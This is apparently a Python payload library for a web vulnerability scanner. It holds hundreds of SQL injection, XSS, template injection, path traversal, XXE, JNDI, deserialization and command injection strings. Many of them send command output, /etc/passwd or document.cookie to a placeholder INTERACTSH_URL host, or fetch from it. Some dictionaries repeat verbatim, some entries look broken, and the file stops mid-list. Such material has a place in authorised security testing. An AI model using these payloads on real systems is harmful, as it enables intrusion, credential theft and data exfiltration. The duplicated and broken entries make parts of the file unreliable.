# Payloads for various web vulnerabilities
# Categories help in selecting appropriate tests

# --- SQL Injection Payloads ---
SQLI_PAYLOADS = {
    "error_based": [
        "' AND 1=CAST((SELECT SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),1,1024)) AS INT)--", # MySQL Table Extraction
        "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT CONCAT_WS(0x3a,USER(),DATABASE(),VERSION()) FROM dual)))--", # MySQL XPath Abuse
        "' AND 1=UPDATEXML(NULL,CONCAT(0x3a,(SELECT @@version)),1)--", # MySQL XML Corruption
        "' AND 1=(SELECT * FROM (SELECT(X)FROM(SELECT(X)FROM(SELECT(X)FROM(SELECT 1/(LENGTH(@@version)-LENGTH(@@version)+1)X)X)X)X))--", # Nested Division Trick
        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(58),VERSION(),CHAR(58),FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)--", # MySQL Error with Randomization
    ],
    "blind_time": [
        "' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>0,BENCHMARK(5000000,SHA1(1)),0)--", # MySQL Benchmark Delay
        "' AND IF(1=1,RLIKE(SELECT CONCAT(CHAR(65),REPEAT(CHAR(66),1000000))),0)--", # MySQL Regex Overload
        "'; DECLARE @x INT; SET @x=1; WHILE @x<10000000 BEGIN SET @x=@x+1 END--", # MSSQL Loop Delay
        "' AND (SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE NULL END)--", # PostgreSQL Conditional Sleep
        "' AND DBMS_UTILITY.WAIT_ON_PENDING_DML('nonexistent',CAST(5 AS NUMBER))--", # Oracle Wait Trick
    ],
    "blind_boolean": [
        "' AND EXISTS(SELECT 1 WHERE SUBSTRING((SELECT DATABASE()),1,1)=CHAR(97))--", # MySQL Char Comparison
        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME REGEXP BINARY '^u')>0--", # MySQL Regex Table Check
        "' AND 1=(CASE WHEN (SELECT SUBSTRING(@@version,1,1))='5' THEN 1 ELSE 0 END)--", # MSSQL Version Check
        "' AND (SELECT LENGTH(CAST(CURRENT_USER AS TEXT)))=LENGTH(CURRENT_USER)--", # PostgreSQL Type Casting
    ],
    "union_based": [
        "' UNION ALL SELECT NULL,CONCAT(CHAR(58),HEX(UNHEX(@@version)),CHAR(58)),NULL--", # MySQL Hex Encoded Version
        "' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),NULL,NULL--", # MySQL Table Dump
        "' UNION SELECT NULL,(SELECT UTL_INADDR.GET_HOST_NAME('localhost') FROM DUAL),NULL--", # Oracle Hostname
    ],
    "oob": [
        "' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(CONCAT(DATABASE(),0x2e,'INTERACTSH_URL'))),'.INTERACTSH_URL\\x')))--", # MySQL UNC Hex Encoded
        "'; EXEC master.dbo.xp_fileexist '\\\\INTERACTSH_URL\\test.txt'--", # MSSQL File Existence OOB
        "' UNION SELECT (SELECT CHR(65)||UTL_HTTP.REQUEST('http://INTERACTSH_URL/'||USER)) FROM DUAL--", # Oracle HTTP with Concat
    ],
    "waf_evasion": [
        "'/**/UNION/**/ALL/**/SELECT/**/NULL,@@version,NULL--", # MySQL Inline Comments
        "'%0bOR%0bASCII(SUBSTRING((SELECT DATABASE()),1,1))>0--", # Vertical Tab Obfuscation
        "'+UNION+ALL+SELECT+NULL,CONCAT(CHAR(58),CAST(VERSION()+AS+CHAR),CHAR(58)),NULL--", # URL Encoded Spaces
        "'/*!50000AND*/(SELECT*FROM(SELECT(SLEEP(0)))a)--", # MySQL Versioned Comment with Subquery
        "' OR 1=CAST(HEX(UNHEX('31')) AS INT)--", # Hex Encoded '1'
    ]
}

# --- Cross-Site Scripting (XSS) Payloads ---
XSS_PAYLOADS = {
    "attribute_injection": [
        "\" onfocus=eval(atob('YWxlcnQoMSk=')) autofocus tabindex=0 \"", # Base64 Eval in Attribute
        "\" style=animation:1s;animation-name:x; onanimationend=alert(1) \"", # CSS Animation Trigger
        "\" accesskey=x onclick=alert(1) \"", # Accesskey Abuse
    ],
    "filter_evasion": [
        "<svg><script>alert&#x28;1&#x29;</script></svg>", # HTML Entities Obfuscation
        "<img src=x onerror=Function('ale'+'rt(1)')()>", # String Concatenation
        "<meta content=\"1;javascript:alert(1)\" http-equiv=\"refresh\">", # Meta Refresh Trick
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", # Base64 Data URI
        "<iframe srcdoc=\"<svg onload=alert(1)>\"></iframe>", # Srcdoc Injection
    ],
    "dom_based": [
        "javascript:void(document.documentElement.innerHTML='<img src=x onerror=alert(1)>')", # DOM Rewrite
        "javascript:window.name='alert(1)';eval(window.name)", # Window Name Abuse
        "data:,eval(atob(location.hash.slice(1)))#YWxlcnQoMSk=", # Data URI with Hash
    ],
    "polyglots": [
        "javascript:/*--></title></style></textarea><svg/onload=Function('ale'+'rt(1)')()>", # Multi-Context with Concat
        "\"'><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", # Charcode Eval
        "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+", # Base64 Polyglot
    ]
}
# --- Server-Side Template Injection (SSTI) Payloads ---
SSTI_PAYLOADS = {
    "code_execution": {
        "jinja2": [
            "{{ cycler.__init__.__globals__.os.popen('curl http://INTERACTSH_URL/`whoami`').read() }}", # OOB Exfil
            "{{ ''.__class__.__mro__[1].__subclasses__()[<INDEX>].__init__.__globals__['sys'].modules['os'].system('id') }}", # Sys Module Abuse (Index Needed)
        ],
        "freemarker": [
            "<#assign x='freemarker.template.utility.Execute'?new()>${x('nslookup INTERACTSH_URL')}", # DNS OOB
        ],
        "ruby_erb": [
            "<%= IO.popen('curl http://INTERACTSH_URL/`whoami`').readlines.join %>", # OOB HTTP
        ],
        "thymeleaf": [
            "[[${T(java.lang.Runtime).getRuntime().exec('nslookup INTERACTSH_URL').waitFor()?'':''}]]", # DNS OOB
        ]
    }
}

# --- Path Traversal Payloads ---
PATH_TRAVERSAL_PAYLOADS = {
    "common_files_unix": [
        "../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/shadow", # Usually needs root
        "../../../../../../../../../../etc/hosts",
        "../../../../../../../../../../etc/issue",
        "../../../../../../../../../../etc/motd",
        "../../../../../../../../../../proc/self/environ", # Check environment vars
        "../../../../../../../../../../proc/version",
        "../../../../../../../../../../var/log/apache2/access.log", # Example log file
        "../../../../../../../../../../var/www/html/config.php", # Example config
    ],
    "common_files_windows": [
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\u_exYYMMDD.log", # Example IIS log
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini", # Older windows
        # "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Users\\Administrator\\NTUser.dat", # Registry Hive - Might cause issues
    ],
    "encoding_bypass": [
        "..%2f..%2f..%2f..%2fetc%2fpasswd", # URL Encoded /
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini", # URL Encoded \
        "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", # URL Encoded .
        "..%c0%af..%c0%afetc/passwd", # Invalid UTF-8 / (Overlong)
        "..%c1%9c..%c1%9cboot.ini", # Invalid UTF-8 \ (Overlong)
        "....//....//....//etc/passwd", # Using //
        "....\\\\....\\\\....\\\\windows\\\\win.ini", # Using \\
    ],
    "null_byte_bypass": [ # Often ineffective on modern systems
        "../../../../etc/passwd%00",
        "..\\..\\..\\windows\\win.ini%00",
    ],
    "wrapper_bypass": [ # If PHP wrappers are enabled
        "php://filter/resource=../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "file:///etc/passwd",
    ]
}

# --- Out-of-Band (OOB) Payloads ---
OOB_PAYLOADS = {
    "php": [
        # DNS
        "<?php system('nslookup INTERACTSH_URL'); ?>",
        "<?php exec('dig INTERACTSH_URL'); ?>",
        "<?php shell_exec('host INTERACTSH_URL'); ?>",
        
        # HTTP/HTTPS
        "<?php file_get_contents('http://INTERACTSH_URL/whoami'); ?>",
        "<?php curl_exec(curl_init('http://INTERACTSH_URL/whoami')); ?>",
        "<?php system('curl http://INTERACTSH_URL/whoami'); ?>",
        "<?php exec('wget -qO- http://INTERACTSH_URL/whoami'); ?>",
        "<?php shell_exec('curl -s http://INTERACTSH_URL/whoami'); ?>",
        "<?php `curl http://INTERACTSH_URL/whoami`; ?>",
        
        # POST data
        "<?php $ch=curl_init(); curl_setopt($ch,CURLOPT_URL,'http://INTERACTSH_URL'); curl_setopt($ch,CURLOPT_POST,1); curl_setopt($ch,CURLOPT_POSTFIELDS,'data='.shell_exec('whoami')); curl_exec($ch); ?>",
        
        # File upload
        "<?php $ch=curl_init(); $fp=fopen('php://temp','w+'); fwrite($fp,shell_exec('whoami')); rewind($fp); curl_setopt($ch,CURLOPT_URL,'http://INTERACTSH_URL'); curl_setopt($ch,CURLOPT_INFILE,$fp); curl_setopt($ch,CURLOPT_INFILESIZE,filesize('php://temp')); curl_exec($ch); ?>",
        
        # SMB
        "<?php system('smbclient -c 'whoami' //INTERACTSH_URL/share'); ?>",
        
        # LDAP
        "<?php ldap_connect('ldap://INTERACTSH_URL:389'); ?>",
        
        # JNDI
        "<?php $jndi = 'ldap://INTERACTSH_URL:1389/Basic/Command/whoami'; ?>",
        
        # XXE
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://INTERACTSH_URL/whoami'>%remote;]>",
        
        # SSRF
        "<?php file_get_contents('http://INTERACTSH_URL/whoami'); ?>",
        
        # Deserialization
        "<?php unserialize('O:8:\"stdClass\":1:{s:4:\"data\";s:10:\"whoami\";}'); ?>",
        
        # Template injection
        "<?php echo '{{7*7}}'; ?>",
        
        # Log injection
        "<?php error_log('whoami', 0); ?>",
        
        # Command injection
        "<?php system('whoami'); ?>",
        "<?php exec('whoami'); ?>",
        "<?php shell_exec('whoami'); ?>",
        "<?php passthru('whoami'); ?>",
        "<?php `whoami`; ?>",
        
        # SQL injection
        "<?php mysql_query('SELECT LOAD_FILE(CONCAT(\"\\\\\",INTERACTSH_URL,\"\\\\\",whoami))'); ?>",
        
        # XSS
        "<?php echo '<script>fetch(\"http://INTERACTSH_URL/whoami\")</script>'; ?>"
    ],
    "dns": [
        "nslookup `whoami`.INTERACTSH_URL",
        "dig `whoami`.INTERACTSH_URL",
        "host `whoami`.INTERACTSH_URL",
        "ping -c 1 `whoami`.INTERACTSH_URL",
        "curl -v `whoami`.INTERACTSH_URL",
        "wget -q -O- `whoami`.INTERACTSH_URL",
        "python -c 'import socket; socket.gethostbyname(\"`whoami`.INTERACTSH_URL\")'",
        "perl -e 'use Socket; gethostbyname(\"`whoami`.INTERACTSH_URL\");'",
        "ruby -e 'require \"socket\"; Socket.gethostbyname(\"`whoami`.INTERACTSH_URL\")'",
        "php -r 'gethostbyname(\"`whoami`.INTERACTSH_URL\");'",
    ],
    "http": [
        "curl http://INTERACTSH_URL/`whoami`",
        "wget -q -O- http://INTERACTSH_URL/`whoami`",
        "python -c 'import urllib.request; urllib.request.urlopen(\"http://INTERACTSH_URL/`whoami`\")'",
        "perl -e 'use LWP::Simple; get(\"http://INTERACTSH_URL/`whoami`\");'",
        "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"http://INTERACTSH_URL/`whoami`\"))'",
        "php -r 'file_get_contents(\"http://INTERACTSH_URL/`whoami`\");'",
        "powershell -Command \"(New-Object System.Net.WebClient).DownloadString('http://INTERACTSH_URL/'+$env:username)\"",
        "certutil -urlcache -split -f http://INTERACTSH_URL/`whoami`",
    ],
    "https": [
        "curl https://INTERACTSH_URL/`whoami`",
        "wget -q -O- https://INTERACTSH_URL/`whoami`",
        "python -c 'import urllib.request; urllib.request.urlopen(\"https://INTERACTSH_URL/`whoami`\")'",
        "perl -e 'use LWP::Simple; get(\"https://INTERACTSH_URL/`whoami`\");'",
        "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"https://INTERACTSH_URL/`whoami`\"))'",
        "php -r 'file_get_contents(\"https://INTERACTSH_URL/`whoami`\");'",
        "powershell -Command \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).DownloadString('https://INTERACTSH_URL/'+$env:username)\"",
    ],
    "post_data": [
        "curl -X POST -d \"output=$(id | base64)\" http://INTERACTSH_URL/",
        "wget --post-data=\"output=$(id | base64)\" http://INTERACTSH_URL/",
        "python -c 'import urllib.request, urllib.parse; data = urllib.parse.urlencode({\"output\": \"$(id | base64)\"}); urllib.request.urlopen(\"http://INTERACTSH_URL/\", data.encode())'",
        "perl -e 'use LWP::UserAgent; my $ua = LWP::UserAgent->new(); $ua->post(\"http://INTERACTSH_URL/\", {output => qx(id | base64)});'",
        "ruby -e 'require \"net/http\"; uri = URI(\"http://INTERACTSH_URL/\"); Net::HTTP.post_form(uri, {\"output\" => %x(id | base64)})'",
        "php -r 'file_get_contents(\"http://INTERACTSH_URL/\", false, stream_context_create([\"http\" => [\"method\" => \"POST\", \"content\" => \"output=\".base64_encode(shell_exec(\"id\"))]]));'",
        "powershell -Command \"$output = (id | base64); $body = @{output=$output} | ConvertTo-Json; Invoke-RestMethod -Uri 'http://INTERACTSH_URL/' -Method Post -Body $body\"",
    ],
    "file_upload": [
        "curl -F 'file=@/etc/passwd' http://INTERACTSH_URL/",
        "wget --post-file=/etc/passwd http://INTERACTSH_URL/",
        "python -c 'import requests; files = {\"file\": open(\"/etc/passwd\", \"rb\")}; requests.post(\"http://INTERACTSH_URL/\", files=files)'",
        "perl -e 'use LWP::UserAgent; my $ua = LWP::UserAgent->new(); $ua->post(\"http://INTERACTSH_URL/\", Content_Type => \"form-data\", Content => [file => [\"/etc/passwd\"]]);'",
        "ruby -e 'require \"net/http\"; uri = URI(\"http://INTERACTSH_URL/\"); Net::HTTP.post_form(uri, {\"file\" => File.open(\"/etc/passwd\")})'",
        "php -r '$ch = curl_init(\"http://INTERACTSH_URL/\"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, [\"file\" => new CURLFile(\"/etc/passwd\")]); curl_exec($ch);'",
        "powershell -Command \"$file = Get-Content '/etc/passwd' -Raw; $body = @{file = $file} | ConvertTo-Json; Invoke-RestMethod -Uri 'http://INTERACTSH_URL/' -Method Post -Body $body\"",
    ],
    "smb": [
        "smbclient -L //INTERACTSH_URL/",
        "smbmap -H INTERACTSH_URL",
        "rpcclient INTERACTSH_URL",
        "enum4linux INTERACTSH_URL",
        "nmap -p445 --script smb-* INTERACTSH_URL",
    ],
    "ldap": [
        "ldapsearch -x -H ldap://INTERACTSH_URL",
        "ldapsearch -x -H ldaps://INTERACTSH_URL",
        "ldapsearch -x -H ldapi://INTERACTSH_URL",
        "ldapsearch -x -H ldap://INTERACTSH_URL -b \"dc=example,dc=com\"",
    ],
    "jndi": [
        "${jndi:ldap://INTERACTSH_URL/exploit}",
        "${jndi:rmi://INTERACTSH_URL/exploit}",
        "${jndi:dns://INTERACTSH_URL/exploit}",
        "${jndi:iiop://INTERACTSH_URL/exploit}",
        "${jndi:corba://INTERACTSH_URL/exploit}",
        "${jndi:nis://INTERACTSH_URL/exploit}",
    ],
    "xxe": [
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
    ],
    "ssrf": [
        "http://INTERACTSH_URL/",
        "https://INTERACTSH_URL/",
        "file:///etc/passwd",
        "dict://INTERACTSH_URL/",
        "gopher://INTERACTSH_URL/",
        "ldap://INTERACTSH_URL/",
        "sftp://INTERACTSH_URL/",
        "tftp://INTERACTSH_URL/",
        "telnet://INTERACTSH_URL/",
        "redis://INTERACTSH_URL/",
        "mongodb://INTERACTSH_URL/",
        "mysql://INTERACTSH_URL/",
        "postgresql://INTERACTSH_URL/",
        "mssql://INTERACTSH_URL/",
        "oracle://INTERACTSH_URL/",
    ],
    "deserialization": [
        "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwAAWgABaQABMl0ABWFycmF5dAAJTGphdmEvbGFuZy9PYmplY3Q7eHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQALawM7CgABA1lAAAJbAAKdAA7TGphdmEvdXRpbC9IYXNoTWFwJEVudHJ5O3hwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcEVudHJ5VjJxbqzl0BSIAAAABwAAAAABcQB+AAZ0AAJpZHQAAXZ0AAJ2YWx0AAJ2MXQAAXZ0AAJ2YWx0AAJ2MnQAAXZ0AAJ2YWx0AAJ2M3QAAXZ0AAJ2YWx0AAJ2NHQAAXZ0AAJ2YWx0AAJ2NXQAAXZ0AAJ2YWx0AAJ2NnQAAXZ0AAJ2YWx0AAJ2N3QAAXZ0AAJ2YWx0AAJ2OHQAAXZ0AAJ2YWx0AAJ2OXQAAXZ0AAJ2YWx0AAJ2MTB0AAJ2YWx0AAJ2MTF0AAJ2YWx0AAJ2MTJ0AAJ2YWx0AAJ2MTN0AAJ2YWx0AAJ2MTQ=",
        "a:2:{i:0;s:4:\"test\";i:1;s:4:\"test\";}",
        "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
        "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\\0\\0\\0event\";O:15:\"Faker\\Generator\":1:{s:13:\"\\0\\0\\0formatters\";a:1:{s:8:\"dispatch\";s:6:\"system\";}}s:8:\"\\0\\0\\0data\";s:2:\"id\";}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
    ],
    "template_injection": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "${config}",
        "<%= config %>",
        "#{config}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${''.__class__.__mro__[1].__subclasses__()}",
        "<%= ''.class.mro[1].subclasses %>",
        "#{''.class.mro[1].subclasses}",
        "{{''.__class__.__mro__[1].__subclasses__()[401](['id'], stdout=-1).communicate()[0].strip()}}",
        "${''.__class__.__mro__[1].__subclasses__()[401](['id'], stdout=-1).communicate()[0].strip()}",
        "<%= ''.class.mro[1].subclasses[401](['id'], stdout=-1).communicate[0].strip %>",
        "#{''.class.mro[1].subclasses[401](['id'], stdout=-1).communicate[0].strip}",
    ],
    "log_injection": [
        "<?php system('id'); ?>",
        "<?php echo shell_exec('id'); ?>",
        "<?php passthru('id'); ?>",
        "<?php exec('id'); ?>",
        "<?php `id`; ?>",
        "<?php system('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php echo shell_exec('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php passthru('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php exec('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php `curl http://INTERACTSH_URL/$(whoami)`; ?>",
    ],
    "command_injection": [
        "`id`",
        "$(id)",
        "; id",
        "& id",
        "| id",
        "&& id",
        "|| id",
        "`curl http://INTERACTSH_URL/`whoami``",
        "$(curl http://INTERACTSH_URL/`whoami`)",
        "; curl http://INTERACTSH_URL/`whoami`",
        "& curl http://INTERACTSH_URL/`whoami`",
        "| curl http://INTERACTSH_URL/`whoami`",
        "&& curl http://INTERACTSH_URL/`whoami`",
        "|| curl http://INTERACTSH_URL/`whoami`",
    ],
    "sql_injection": [
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT UNHEX(HEX(@@HOSTNAME))), '.INTERACTSH_URL\\\\', 'abc'))--",
        "' UNION SELECT UTL_HTTP.REQUEST('http://INTERACTSH_URL') FROM DUAL--",
        "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('INTERACTSH_URL') FROM DUAL--",
        "COPY (SELECT '') TO PROGRAM 'nslookup INTERACTSH_URL'--",
        "' UNION SELECT pg_sleep(1), pg_read_file('http://INTERACTSH_URL/')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/passwd')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/shadow')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/hosts')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/issue')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/motd')--",
    ],
    "xss": [
        "<img src=x onerror=\"fetch('http://INTERACTSH_URL/'+document.cookie)\">",
        "<img src=x onerror=\"new Image().src='http://INTERACTSH_URL/'+document.cookie\">",
        "<img src=x onerror=\"var x=new XMLHttpRequest();x.open('GET','http://INTERACTSH_URL/'+document.cookie);x.send();\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+document.cookie;\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+btoa(document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie+':'+document.location);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie+':'+document.location+':'+document.referrer);\">",
    ],
    "xxe": [
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=config.php\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=.env\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
    ],
    "ssrf": [
        "http://INTERACTSH_URL/",
        "https://INTERACTSH_URL/",
        "file:///etc/passwd",
        "dict://INTERACTSH_URL/",
        "gopher://INTERACTSH_URL/",
        "ldap://INTERACTSH_URL/",
        "sftp://INTERACTSH_URL/",
        "tftp://INTERACTSH_URL/",
        "telnet://INTERACTSH_URL/",
        "redis://INTERACTSH_URL/",
        "mongodb://INTERACTSH_URL/",
        "mysql://INTERACTSH_URL/",
        "postgresql://INTERACTSH_URL/",
        "mssql://INTERACTSH_URL/",
        "oracle://INTERACTSH_URL/",
    ],
    "deserialization": [
        "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwAAWgABaQABMl0ABWFycmF5dAAJTGphdmEvbGFuZy9PYmplY3Q7eHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQALawM7CgABA1lAAAJbAAKdAA7TGphdmEvdXRpbC9IYXNoTWFwJEVudHJ5O3hwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcEVudHJ5VjJxbqzl0BSIAAAABwAAAAABcQB+AAZ0AAJpZHQAAXZ0AAJ2YWx0AAJ2MXQAAXZ0AAJ2YWx0AAJ2MnQAAXZ0AAJ2YWx0AAJ2M3QAAXZ0AAJ2YWx0AAJ2NHQAAXZ0AAJ2YWx0AAJ2NXQAAXZ0AAJ2YWx0AAJ2NnQAAXZ0AAJ2YWx0AAJ2N3QAAXZ0AAJ2YWx0AAJ2OHQAAXZ0AAJ2YWx0AAJ2OXQAAXZ0AAJ2YWx0AAJ2MTB0AAJ2YWx0AAJ2MTF0AAJ2YWx0AAJ2MTJ0AAJ2YWx0AAJ2MTN0AAJ2YWx0AAJ2MTQ=",
        "a:2:{i:0;s:4:\"test\";i:1;s:4:\"test\";}",
        "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
        "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\\0\\0\\0event\";O:15:\"Faker\\Generator\":1:{s:13:\"\\0\\0\\0formatters\";a:1:{s:8:\"dispatch\";s:6:\"system\";}}s:8:\"\\0\\0\\0data\";s:2:\"id\";}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
    ],
    "template_injection": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "${config}",
        "<%= config %>",
        "#{config}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${''.__class__.__mro__[1].__subclasses__()}",
        "<%= ''.class.mro[1].subclasses %>",
        "#{''.class.mro[1].subclasses}",
        "{{''.__class__.__mro__[1].__subclasses__()[401](['id'], stdout=-1).communicate()[0].strip()}}",
        "${''.__class__.__mro__[1].__subclasses__()[401](['id'], stdout=-1).communicate()[0].strip()}",
        "<%= ''.class.mro[1].subclasses[401](['id'], stdout=-1).communicate[0].strip %>",
        "#{''.class.mro[1].subclasses[401](['id'], stdout=-1).communicate[0].strip}",
    ],
    "log_injection": [
